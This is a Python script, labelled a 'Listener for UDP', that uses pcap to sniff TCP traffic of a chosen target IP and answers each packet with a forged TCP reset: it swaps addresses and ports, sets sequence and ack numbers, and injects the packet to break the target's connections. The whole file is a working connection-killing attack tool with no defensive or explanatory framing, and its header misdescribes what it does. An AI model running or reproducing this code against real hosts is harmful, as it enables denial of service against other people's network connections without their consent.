
# This Listener for UDP
# July.18th.2o1o

from comachd import DeframeError,FrameLengthError
from comachd import CoTcpUdpPacketRoot
from comachd import CoMacHd, CoMacIpHd, CoUdpHd, CoTcpHd, CoUdpTcpHd, CoTcpUdpPacketRoot,CoIpv4Hd
from coshake import BytesToHexStream,HexStreamToBytes

import RapLanV1

dev1 = None
decodeError = 0
timeOutCnt = 0

def ConstructRst(raw_pack):
    mac_s = raw_pack.MacHead()
    assert isinstance(mac_s, CoMacHd )
    ip_s = raw_pack.IpHead()
    assert isinstance(ip_s, CoIpv4Hd)
    tcp_s = raw_pack.TcpUdpHd()
    assert isinstance(tcp_s, CoUdpTcpHd )
    
    mac_r = CoMacIpHd ( mac_s.SrcMac(), mac_s.DestMac() )
    
    ip_r = CoIpv4Hd.New(ip_s.toHexStream())
    ip_r.SetDstIp( ip_s.SourceIP() )
    ip_r.SetSrcIp( ip_s.DestinationIP() )

    tcp_r = CoTcpHd.New(tcp_s.toHexStream())
    print(" %d <=> %d" % ( tcp_s.DestinationPort() , tcp_s.SourcePort() ) )
    tcp_r.SetSourcePort(  tcp_s.DestinationPort() )
    tcp_r.SetDestinationPort( tcp_s.SourcePort() )
    tcp_r.SetAckNo( tcp_s.Seq() + 1 )
    tcp_r.SetSeq( tcp_s.AckNo() + 1 )
    #tcp_r.SetFlags( 1,1,1,0,0,1 )
    tcp_r.SetFlags( 1,1,1,1,0,0 )
    revd = CoTcpUdpPacketRoot( mac_r , ip_r, tcp_r , raw_pack.Data())
    return revd


def ShowTcpUdpPack(din,prompt):
    try:
        if 0>=len(din):
            global timeOutCnt
            timeOutCnt += 1
            #print(prompt)
        else:
            hs = BytesToHexStream(din)
            packet = CoTcpUdpPacketRoot.New(hs)
            if not packet.TcpUdpHd().IsRst()  and not packet.TcpUdpHd().IsFin():
                q = ConstructRst(packet)
                dev1.Send(HexStreamToBytes( q.toHexStream() ) )
                #print("Go hell~")
                print("from %16s:%6d to %16s:%6d, len = %6d"%(packet.SrcIP(),packet.SrcPort(),packet.DestIP(),packet.DestPort(),packet.TcpUdpLength()))
            #if packet.SrcIP() == targetIP and packet.DestIP() == bcastIP:
    except DeframeError:
        global decodeError
        decodeError += 1
    return True

def SniperGo(cnt,_target):
    fstr = "tcp and host " + _target
    print("Filter string = %s"%fstr)
    dev1.SetFilter(fstr,0xffFFff)
    rCnt = dev1.ProcessPcap(cnt,ShowTcpUdpPack)
    return rCnt

if '__main__'==__name__:
    import sys
    capTime = 20
    capd = 666
    target = "192.168.1.43"
    if len(sys.argv) > 1:
        capTime = int(sys.argv[1])
    if len(sys.argv) > 2:
        capd = int(sys.argv[2])
    if len(sys.argv) > 3:
        target = sys.argv[3]

    #global dev1
    dev1 = RapLanV1.PcapIf(RapLanV1.AdList()[0], Timeout = capd )
    print(dev1.AdDesc)
        
    print("Going to do %d times, timeout set to %d"%(capTime,capd))
    try:
        gotCnt = SniperGo(capTime,target)
        print("".ljust(20,'#'))
        print("%d packet(s) retrieved." % gotCnt )
        print("%d timeout(s)"%(timeOutCnt))
        assert timeOutCnt + gotCnt == capTime
    except KeyboardInterrupt:
        print(dev1.AdDesc, ' offline.')
        print("Termination of this program.")

    
